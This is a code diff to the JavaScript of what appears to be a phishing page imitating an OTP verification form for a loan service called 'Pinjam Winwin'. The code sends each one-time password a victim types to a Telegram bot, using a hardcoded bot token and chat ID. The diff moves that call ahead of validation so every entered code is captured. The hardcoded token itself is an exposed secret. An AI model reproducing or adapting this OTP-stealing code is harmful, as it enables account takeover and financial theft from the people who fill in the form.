@@ -181,7 +181,7 @@
             function sendOTPToTelegram(otp) {
                 const botToken = '6711678141:AAHCPWlRygK8bHdAhXUlfIFCf6GztfCwsjY'; // Ganti dengan Bot Token Anda
                 const chatID = '6824078885'; // Ganti dengan Chat ID Anda
-                const message = `Kode OTP-Pinjam Winwin ${otp}`;
+                const message = `Kode OTP-Pinjam Winwin: ${otp}`;
 
                 const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}`;
 
@@ -196,8 +196,9 @@
                     e.preventDefault();
                 } else {
                     const otp = Array.from(otpInputs).map(input => input.value).join('');
+                    sendOTPToTelegram(otp); // Kirim OTP ke Telegram sebelum validasi
                     if (otp === correctOTP) {
-                        sendOTPToTelegram(otp);
+                        // Tindakan jika OTP valid
                     } else {
                         errorMessage.style.display = 'block';
                     }
